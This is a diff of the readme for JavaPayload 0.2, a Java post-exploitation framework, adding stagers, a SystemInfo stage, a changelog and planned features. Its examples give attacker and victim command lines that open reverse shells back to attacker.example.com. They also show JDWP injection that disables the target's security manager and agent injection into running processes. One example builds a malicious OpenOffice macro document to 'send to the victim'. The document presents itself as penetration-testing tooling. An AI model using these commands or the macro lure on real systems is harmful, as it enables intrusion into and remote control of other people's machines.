@@ -12,7 +12,7 @@ p {margin-left: 2em; margin-right: 2em;}
 
 <p><i>&copy; 2010 Michael 'mihi' Schierl, <tt>&lt;schierlm at users dot sourceforge dot net&gt;</tt></i></p>
 
-<p><a href="JavaPayload-0.1.zip">Download JavaPayload-0.1.zip</a> (both source and compiled classes, 138 KB)</p>
+<p><a href="JavaPayload-0.2.zip">Download JavaPayload-0.2.zip</a> (both source and compiled classes, 197 KB)</p>
 
 <h2>Introduction</h2>
 
@@ -65,15 +65,88 @@ of them (which is expected to implement the <tt>javapayload.stage.Stage</tt> int
 that runs the stager in the same Java process which is used for the handler (useful for debugging more complex
 stages). All these stagers (except the LocalTest one) will need a hostname and a port number as parameters.</p>
 
+<p>There is also a JDWPTunnel stager that can be only used with the JDWPInjector and will tunnel the payload stream
+directly over the JDWP connection. This is slower than a dedicated connection, but in some cases a dedicated
+connection is not possible.</p>
+
+<p>The BindMultiTCP stager works like the BindTCP stager, but can accept more than one connection at the same time.
+This is useful if you want to test multiple payloads against the same machine.</p>
+
+<p>The ReverseTCP stager handler can auto-bind to a port if you specify # as the port number.
+In this case, the stager handler will print the port number to stdout. When this handler is used
+in conjunction with JDWPInjector or with the AttachInjector, the new port number will automatically be
+used in the command line to the remote process.</p>
+
+<p>The stager handler MultiListen can be used to run a stage that only outputs information (like the SystemInformation stage)
+multiple times (even multi-threaded). This will work with ReverseTCP and ReverseSSL stagers, you will have to give the full
+command line for this to the stager. Example: <tt>MultiListen ReverseTCP attacker.example.com -- SystemInfo</tt>.
+</p>
+
 <h3>Stages</h3>
 
 <p>Stages are loaded by a stager and responsible for doing what you want to do on the victim's host (like provide a
 shell or execute an uploaded file). The included stages are Exec (execute a command with parameters), 
 UpExec (upload a file and execute it with parameters), Shell (execute a shell based on operating system, 
-cmd.exe for Windows and /bin/sh for everything else) and JSh (try it yourself, it is awesome). All these
-stages will forward stdin, stdout and stderr streams automatically. Shell and JSh do not need parameters, the other
+cmd.exe for Windows and /bin/sh for everything else), SystemInfo (return system information, including local and 
+remote IP addresses) and JSh (try it yourself, it is awesome). All these stages will forward stdin, stdout and 
+stderr streams automatically. Shell, SystemInfo and JSh do not need parameters, the other
 two expect a command name and optional arguments - for UpExec the command name should be an absolute file name
 on the attacker's machine, which will be uploaded to the temp directory and executed there.</p>
+
+<h2>Changes since version 0.1</h2>
+
+<ul>
+<li>New stagers: MultiListen (handler only), JDWPTunnel, BindMultiTCP</li>
+<li>New stage: SystemInfo</li>
+<li>ReverseTCP: Add ability to choose random port</li>
+<li>JDWPInjector: Support for disabling security manager in target VM</li>
+<li>BeanShellMacroBuilder: build OpenOffice bean shell macros</li>
+<li>AgentJarBuilder, AppletJarBuilder, JarBuilder: Support including more than one stager </li>
+<li>AttachInjector: Get a list of VMs to inject into</li>
+<li>Bug and stability fixes:
+<ul>
+  <li>Use WrappedPipedOutputStream in handlers (where applicable) to avoid "Write end death" exceptions</li>
+  <li>Fix a bunch of help texts in JSh</li>
+  <li>Speed up injecting classes via JDWP (by uploading the whole array at once and not byte for byte)</li></ul></li>
+<li>Framework improvements:
+<ul>
+  <li>Add support to call stage handlers and injectors from other stages (including stream redirection)</li>
+  <li>Clean up interface to handlers for injectors:
+  <ul>
+    <li>New methods "prepare" and "needsHandleBeforeStart"</li>
+    <li>inner class StageHandler.Loader with handleBefore and handleAfter methods (meaning before and after running the injector)</li></ul></li>
+  <li>New abstract class ListeningStagerHandler to encapsulate common features of BindTCP and ReverseTCP and maybe others</li>
+  <li>JarBuilder: Add support for adding an extra resource file</li>
+  <li>StageHandler: "createClone" function mandatory</li></ul></li>
+</ul>
+
+<h2>Upcoming features</h2>
+
+<p>I am currently working on a new stage that uses a dynamic classloader to load "normal" Java classes on demand over the stager input stream.
+It also provides these classes with an unlimited number of streams tunnelled over the same stager input stream. It comes with a command line
+client that can keep multiple "sessions" to payloads open and send commands to them by sending a serialized Java object that contains the
+required command implementation. Supported commands include running stages (resulting in another pair of forwarded streams), running handlers (resulting
+in new sessions "inside" sessions), copying files over sessions, a simple ping/echo test command, forwarding TCP connections, forwarding audio,
+change audio mixer settings (volume/mute/recording source), take screenshots and remote control features, and the always-loved cat and telnet
+commands. It comes with a job control similar to JSh (with backgrounding, but the jobs are all handled on the attacker's computer), and dynamically 
+routes the forwarded streams over the shortest way available (i. e. if you have session s1 and run two handlers, there, you get sessions s1:s1 and s1:s2. 
+Copying a file from s1:s1 to s1:s2 will send the file via the s1 session but <b>not</b> back to the attacker machine). The classloaders will also take
+care about whether a parent session has the class already, so that the class will not be requested again. This handlers need a few tricks to work fine
+in all conditons, especially since the stage uses static class loading, and the stager will avoid loading system classes over the network. So you can
+run into a situation where the stage class' Class object is inaccessible to one of the command classes (as it is loaded by a child classloader), which
+has to be solved by dynamically falling back to reflection. I already have an almost working prototype, but it will still need a bit of more testing before
+I can release it.</p>
+
+<p>In addition, I am working on WAR support (drop a servlet and run a stager), including tunnelling connections over HTTP(S), or alternatively
+using a findsock stager that picks the correct socket from private instance variables and hijacks it from the servlet container to create a
+bi-directional channel. The tunnelling stager (working similarily to the <tt>httptunnel</tt> program) is a bit tricky to make really rock-stable,
+because of different timeout settings in different servlet containers. But as the findsock stager will inherently be unstable (depending on the
+fact that the socket object can be found, and that the socket is not read while we use it), the tunnel stager really has to be rock solid in my
+opinion. <tt>:-)</tt></p>
+
+<p>Note that all will be implemented in pure Java with no line of native code!</p>
+
+<p><i>Stay tuned!</i></p>
 
 <h2>System requirements</h2>
 
@@ -125,7 +198,7 @@ the ASM libraries and/or the JDK's <tt>tools.jar</tt> have to be in the classpat
 <p>copy embedded.jar to the victim's machine.</p>
 <p><tt>java javapayload.handler.stager.StagerHandler ReverseSSL attacker.example.com 2010 -- JSh</tt></p>
 
-<p>On the "victim" machine:</p>
+<p><b>On the "victim" machine:</b></p>
 
 <p><tt>java -jar embedded.jar</tt></p>
 
@@ -172,6 +245,10 @@ the ASM libraries and/or the JDK's <tt>tools.jar</tt> have to be in the classpat
 
 <p>Load index.html on the "victim" machine in a Java-enabled web browser.</p>
 
+<p><i>note:</i> For all the <tt>*JarBuilder</tt> commands (except <tt>EmbeddedJarBuilder</tt>), 
+you can give as many stagers as you like. For example, if you want to have all included stagers
+in a single applet jar file, you can call <tt>java javapayload.builder.AppletJarBuilder ReverseTCP ReverseSSL BindTCP BindMultiTCP</tt>.</p>
+
 <h3>JDWP example</h3>
 
 <p><b>On the "attacker" machine:</b></p>
@@ -182,6 +259,19 @@ the ASM libraries and/or the JDK's <tt>tools.jar</tt> have to be in the classpat
 
 <p><i>Note:</i> As shown in this example, the same port can be used for both the JDWP connection and the reverse
 TCP or SSL connection. You can also use different ports, if preferred.</p>
+
+<p><i>Note 2:</i> If the target process has a security manager installed, loading the stage will most likely fail.
+In that case you can add an exclamation mark to the port specification (like "2010!") to deactivate the security
+manager in the target process. Note that in this case the security manager will remain disabled even after your
+payload terminates, so make sure to not open additional security holes in your pen-test when trying this!</p>
+
+<h3>JDWP tunnelling example</h3>
+
+<p><b>On the "attacker" machine:</b></p>
+<p><tt>java javapayload.builder.JDWPInjector 2010 JDWPTunnel -- JSh</tt></p>
+
+<p><b>On the "victim" machine:</b></p>
+<p><tt>java -Xrunjdwp:transport=dt_socket,suspend=y,server=n,address=attacker.example.com:2010</tt></p>
 
 <h3>Agent example (loading the agent jar into a new Java process that runs a different program)</h3>
 <p>This example requires Java 1.5 or above on both attacker and victim computer!</p>
@@ -199,10 +289,25 @@ TCP or SSL connection. You can also use different ports, if preferred.</p>
 
 <h3>Attach example (loading the Agent jar into an existing process on the same machine via Attach API)</h3>
 <p>This example requires Java 1.6 or above on your computer! Start any other Java program and look up its pid
-first!</p>
+first:</p>
+
+<p><tt>java javapayload.builder.AttachInjector list</tt></p>
+
+<p>Then you can use the pid:</p>
 
 <p><tt>java javapayload.builder.AgentJarBuilder ReverseSSL</tt></p>
 <p><tt>java javapayload.builder.AttachInjector <i>&lt;pid&gt;</i> \absolute\path\to\Agent_ReverseSSL.jar ReverseSSL localhost 2010 -- JSh</tt></p>
+
+<h3>OpenOffice BeanShell macro example</h3>
+
+<p><b>On the "attacker" machine:</b></p>
+<p><tt>java javapayload.builder.BeanShellMacroBuilder ReverseTCP attacker.example.com 2010 -- JSh &gt;1.bsh</tt></p>
+<p>Now create a new OpenOffice document, add a BeanShell macro and paste the contents of 1.bsh into it (remove all of the example lines already in the new macro). Go to Tools-&gt;Customize-&gt;Events and add a document open event that runs your new macro. Make sure to save this event in the document (and not in the application). Save the document and send it to the victim.</p>
+<p><tt>java javapayload.handler.stager.StagerHandler ReverseTCP attacker.example.com 2010 -- JSh</tt></p>
+
+<p><b>On the "victim" machine:</b></p>
+
+<p>Open the document with OpenOffice and say "yes" when you are asked whether to execute macros.</p>
 
 </body>
 </html>
